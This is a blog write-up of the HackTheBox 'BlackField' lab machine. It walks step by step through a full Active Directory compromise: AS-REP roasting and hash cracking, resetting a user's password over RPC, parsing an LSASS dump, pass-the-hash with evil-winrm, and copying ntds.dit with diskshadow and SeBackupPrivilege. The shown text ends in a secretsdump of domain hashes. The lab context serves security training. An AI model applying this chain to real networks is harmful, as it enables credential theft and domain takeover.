<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>HTB BlackField Writeup · Ikonw</title><meta name="description" content="HTB BlackField Writeup - Ikonw"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/gandalfr.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/solarized-light.min.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Ikonw"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="https://p4.itc.cn/q_70/images03/20230225/87c56a7134574d718cd48f0955a962f4.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><!-- Search Bar--><li style="margin-top: 10px;" class="nav-list-item"><form action="/search" method="GET"><input type="text" name="query" placeholder="Search" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-right: 5px; width: 200px;"><button type="submit" style="padding: 8px 12px; border: none; border-radius: 4px; background-color: #007bff; color: white; cursor: pointer;"> </button></form></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HTB BlackField Writeup</h1><div class="tags"><a href="/tags/hackthebox/" class="tag-title">#hackthebox</a><a href="/tags/hard/" class="tag-title">#hard</a></div><div class="post-info">Jun 10, 2020</div><div class="post-content"><p><img src="/images/HTB-Blackfield-Hard/image-20200907210058092.png" alt="image-20200907210058092"></p>
<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author: Ikonw"></a>Author: Ikonw</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan:"></a>Nmap Scan:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 20:09 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.192</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE       VERSION</span><br><span class="line">88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-07 19:09:38Z)</span><br><span class="line">135/tcp  open     msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  filtered netbios-ssn</span><br><span class="line">389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open     microsoft-ds?</span><br><span class="line">593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 6h59m59s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2020-09-07T19:09:47</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 51.59 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Launch smbmap login using anonymous account, found 2 files we can read</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/opt/nmapAutomator]</span><br><span class="line">└─<span class="comment"># smbmap -H 10.10.10.192 -u anonymous                                                                                   2 ⨯</span></span><br><span class="line">[+] Guest session       IP: 10.10.10.192:445    Name: 10.10.10.192                                      </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                NO ACCESS       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                NO ACCESS       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  NO ACCESS       Logon server share </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>Access to <strong>profiles$</strong></p>
<p>We found tons of user name, use along with awk command we collect the usernames</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.192\\profiles$ -c <span class="built_in">ls</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; user.lst</span><br></pre></td></tr></table></figure>

<p>Launch the impacket tool <strong>GetNPUsers.py</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">└─<span class="comment"># python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.local/ -no-pass -usersfile user.lst | grep -v &quot;not found&quot;</span></span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User audit2020 doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">$krb5asrep$23$support@BLACKFIELD.LOCAL:d3f58a3eb5d36dc74f2c4a4335a5ce3e$06ce4ccf78e620d6e2e9994bd546f519cabec98dd1879365456bcee2081d7f0579d8e6b20d7b0e5750c533de72b48404ad38bf2241acc01cdf9e1868717cb01142ab131ebda7de2a0916a141ba5b1fd1b8e0895833ea57ce4b01cd93900eba7c4bab1e1a8dfcdb471486fedc1f731b5e65f38219e37883274350288d916e18f43359a170dd9aa3ef22d53c399378ed3467467211d6be448ee73983abe6cf7998725bfa70b7de45969715c15417af5249ebe9dd16332222f17101bbb1bdbfc2d32ac2bc319302911973a88a2b67fd425092e0f31329d04fd9eca106a97f2265185f6ae6c8ca8e747272dcad410bfbedac0275ed12</span></span><br><span class="line"><span class="string">[-] User svc_backup doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] invalid principal syntax</span><br></pre></td></tr></table></figure>

<p>Save the hash and use john to crack it.</p>
<p>We got the creds <strong>support:#00^BlackKnight</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">└─<span class="comment"># john --wordlist=/usr/share/wordlists/rockyou.txt user_hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line"><span class="comment">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)</span></span><br><span class="line">1g 0:00:00:16 DONE (2020-09-07 21:30) 0.06203g/s 889266p/s 889266c/s 889266C/s <span class="comment">#1ByNature..#*burberry#*1990</span></span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Try login using winrm port, but it failed.</p>
<p>Let’s go back to use new credentials to smb server</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">└─<span class="comment"># smbmap -H 10.10.10.192 -u support -p &quot;#00^BlackKnight&quot;                                                                2 ⨯</span></span><br><span class="line">[+] IP: 10.10.10.192:445        Name: BLACKFIELD.<span class="built_in">local</span>                                  </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                NO ACCESS       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Found nothing interesting </p>
<p>use rpcclient connect to rpc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U blackfield.local\\support 10.10.10.192</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[audit2020] rid:[0x44f]</span><br><span class="line">user:[support] rid:[0x450]</span><br><span class="line">user:[BLACKFIELD764430] rid:[0x451]</span><br><span class="line">user:[BLACKFIELD538365] rid:[0x452]</span><br><span class="line">user:[BLACKFIELD189208] rid:[0x453]</span><br><span class="line">user:[BLACKFIELD404458] rid:[0x454]</span><br><span class="line">user:[BLACKFIELD706381] rid:[0x455]</span><br><span class="line">user:[BLACKFIELD937395] rid:[0x456]</span><br><span class="line">...........................</span><br></pre></td></tr></table></figure>

<p>We got tons of user again.</p>
<p>After research, nothing special. But came along with a article using rpc to reset domain user password</p>
<p><a target="_blank" rel="noopener" href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">Reset AD User password with Linux</a></p>
<p>Make a change to user <strong>audit2020</strong> password to Ikonw123!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; setuserinfo2</span><br><span class="line">Usage: setuserinfo2 username level password [password_expired]</span><br><span class="line">result was NT_STATUS_INVALID_PARAMETER</span><br><span class="line">rpcclient $&gt; setuserinfo2 audit2020 23 Ikonw123!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Sadly, we still not able login using winrm but we can access <strong>audit2020</strong>‘s smb share again.</p>
<p>yeah smb share againnnn.</p>
<p>This time round, forensic folder is available to us</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/opt/nmapAutomator/10.10.10.192/nmap]</span><br><span class="line">└─<span class="comment"># smbmap -H 10.10.10.192 -u audit2020 -p Ikonw123!</span></span><br><span class="line">[+] IP: 10.10.10.192:445        Name: BLACKFIELD.<span class="built_in">local</span>                                  </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                READ ONLY       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/opt/nmapAutomator/10.10.10.192/nmap]</span><br><span class="line">└─# smbclient \\\\10.10.10.192\\forensic -U audit2020                                      </span><br><span class="line">Enter WORKGROUP\audit2020&#x27;s password: </span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Sun Feb 23 21:03:16 2020</span><br><span class="line">  ..                                  D        0  Sun Feb 23 21:03:16 2020</span><br><span class="line">  commands_output                     D        0  Mon Feb 24 02:14:37 2020</span><br><span class="line">  memory_analysis                     D        0  Fri May 29 04:28:33 2020</span><br><span class="line">  tools                               D        0  Sun Feb 23 21:39:08 2020</span><br><span class="line"></span><br><span class="line">                7846143 blocks of size 4096. 3978511 blocks available</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure>

<p>Alright, it seems tons of files. Download the folder to local (If your internet connection is slow, you might also consider just mount the smb directory to local)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget *</span><br></pre></td></tr></table></figure>



<blockquote>
<p>A DMP file is a file that contains data “dumped” from a program’s memory space. It is often created when a program has an error or crashes and may also be saved by the program “Savedump.exe” on the first reboot after a crash. DMP files are usually named “Memory.dmp.”</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/skelsec/pypykatz">pypykatz</a> has the ability to parse the secrets hidden in the LSASS process, it is just something like mimikatz’s <strong>sekurlsa::</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.DMP</span><br></pre></td></tr></table></figure>

<p>and we actually got the password hash for user <strong>svc_backup</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== MSV ==</span><br><span class="line">        Username: svc_backup</span><br><span class="line">        Domain: BLACKFIELD</span><br><span class="line">        LM: NA</span><br><span class="line">        NT: 9658d1d1dcd9250115e2205d9f48400d</span><br><span class="line">        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>No need to bruteforce, we can directly pass the hash using evil-winrm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[/opt/nmapAutomator/10.10.10.192/nmap/memory_analysis]</span><br><span class="line">└─# evil-winrm.rb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192   </span><br></pre></td></tr></table></figure>

<h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>After checking the user’s privileges, found out that <strong>SeBackupPrivilege</strong> is enabled.</p>
<blockquote>
<p><strong>SeBackupPrivilege</strong><br>Description: This privilege causes the system to grant all read access control to any file, regardless of the <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/library/windows/desktop/ms721532#-security-access-control-list-gly"><em>access control list</em></a> (ACL) specified for the file.</p>
</blockquote>
<p>Firstly, I tried the <strong>vssadmin</strong>, well I don’t have the privilege</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users&gt; vssadmin create shadow /for=C:</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001-2013 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">Error: You don&#x27;t have the correct permissions to run this command.  Please run this utility from a command</span><br><span class="line">window that has elevated administrator privileges.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Members of “Backup Operators” can logon locally on a Domain Controller and backup the NTDS.DIT, for ex. with: “wbadmin.exe” or “diskshadow.exe</p>
</blockquote>
<p>As I read carefully, found out that diskshadow allow us to create a new shadow disk copy of the disk C and expose it as another driver</p>
<p>shadow_copy.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias ikonw</span><br><span class="line">create</span><br><span class="line">expose %ikonw% z:</span><br></pre></td></tr></table></figure>

<p>However it has error </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-&gt; set context persistent nowriter  &lt;&lt;--- shudnt it be nowriters?</span><br><span class="line"></span><br><span class="line">SET CONTEXT &#123; CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] &#125;</span><br><span class="line"></span><br><span class="line">        CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.</span><br><span class="line">        PERSISTENT              Specify that shadow copy is persist across program exit, reset or reboot.</span><br><span class="line">        PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.</span><br><span class="line">        VOLATILE                Specify that shadow copy will be deleted on exit or reset.</span><br><span class="line">        VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.</span><br><span class="line"></span><br><span class="line">        Example: SET CONTEXT CLIENTACCESSIBLE</span><br></pre></td></tr></table></figure>

<p>Add extra character behind</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriterss</span><br><span class="line">add volume c: alias ikonww</span><br><span class="line">createe</span><br><span class="line">expose %ikonw% z::</span><br></pre></td></tr></table></figure>

<p>However one more error!!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The .cab metadata file cannot be stored in the current working directory, because it is read-only.</span><br></pre></td></tr></table></figure>

<p>ermmm, maybe I am in the <strong>document directory</strong></p>
<p>create a temp folder at <strong>C:\temp</strong></p>
<p>Finally, we successfully create the shadow disk at Z: drive</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; diskshadow /s shadow_copy.txt</span><br><span class="line">Microsoft DiskShadow version 1.0</span><br><span class="line">Copyright (C) 2013 Microsoft Corporation</span><br><span class="line">On computer:  DC01,  9/8/2020 5:40:45 AM</span><br><span class="line"></span><br><span class="line">-&gt; <span class="built_in">set</span> context persistent nowriters</span><br><span class="line">-&gt; add volume c: <span class="built_in">alias</span> ikonw</span><br><span class="line">-&gt; create</span><br><span class="line">Alias ikonw <span class="keyword">for</span> shadow ID &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line">Alias VSS_SHADOW_SET <span class="keyword">for</span> shadow <span class="built_in">set</span> ID &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line"></span><br><span class="line">Querying all shadow copies with the shadow copy <span class="built_in">set</span> ID &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125;</span><br><span class="line"></span><br><span class="line">        * Shadow copy ID = &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125;               %ikonw%</span><br><span class="line">                - Shadow copy <span class="built_in">set</span>: &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125;       %VSS_SHADOW_SET%</span><br><span class="line">                - Original count of shadow copies = 1</span><br><span class="line">                - Original volume name: \\?\Volume&#123;351b4712-0000-0000-0000-602200000000&#125;\ [C:\]</span><br><span class="line">                - Creation time: 9/8/2020 5:40:45 AM</span><br><span class="line">                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br><span class="line">                - Originating machine: DC01.BLACKFIELD.<span class="built_in">local</span></span><br><span class="line">                - Service machine: DC01.BLACKFIELD.<span class="built_in">local</span></span><br><span class="line">                - Not exposed</span><br><span class="line">                - Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125;</span><br><span class="line">                - Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br><span class="line"></span><br><span class="line">Number of shadow copies listed: 1</span><br><span class="line">-&gt; expose %ikonw% z:</span><br><span class="line">-&gt; %ikonw% = &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125;</span><br><span class="line">The shadow copy was successfully exposed as z:\.</span><br><span class="line">-&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/HTB-Blackfield-Hard/image-20200908134638982.png" alt="image-20200908134638982"></p>
<p>The z: drive shadow folder permission also inherited from the C:, we dont have the permission to download the files.</p>
<p>After looking at the <a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege">github page</a></p>
<blockquote>
<ul>
<li>If you want to read&#x2F;copy data out of a “normally forbidden” folder, you have to act as a backup software. The shell <code>copy</code> command won’t work; you’ll need to open the source file manually using <code>CreateFile</code> making sure to specify the <code>FILE_FLAG_BACKUP_SEMANTICS</code> flag.</li>
</ul>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll">SeBackupPrivilegeCmdLets.dll</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll">SeBackupPrivilegeUtils.dll</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Evil-WinRM* PS C:\temp&gt; Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; <span class="built_in">cd</span> z:\windows\ntds</span><br><span class="line">*Evil-WinRM* PS z:\windows\ntds&gt; Copy-FileSeBackupPrivilege ntds.dit c:\temp\ntds.dit</span><br><span class="line">*Evil-WinRM* PS z:\windows\ntds&gt; <span class="built_in">cd</span> c:\temp</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----         9/8/2020   5:40 AM            617 2020-09-08_5-40-45_DC01.cab</span><br><span class="line">-a----         9/8/2020   5:52 AM       18874368 ntds.dit</span><br><span class="line">-a----         9/8/2020   5:50 AM          12288 SeBackupPrivilegeCmdLets.dll</span><br><span class="line">-a----         9/8/2020   5:51 AM          16384 SeBackupPrivilegeUtils.dll</span><br><span class="line">-a----         9/8/2020   5:40 AM             88 shadow_copy.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>and we got the ntds.dit files. download to kali</p>
<p>and use <strong>secretsdump</strong> ,I just realize still need a extra system hive file.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\temp\system.hive</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">└─<span class="comment"># python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive -hashes lmhash:nthash LOCAL -outputfile hash | more</span></span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line">[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span></span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::</span><br><span 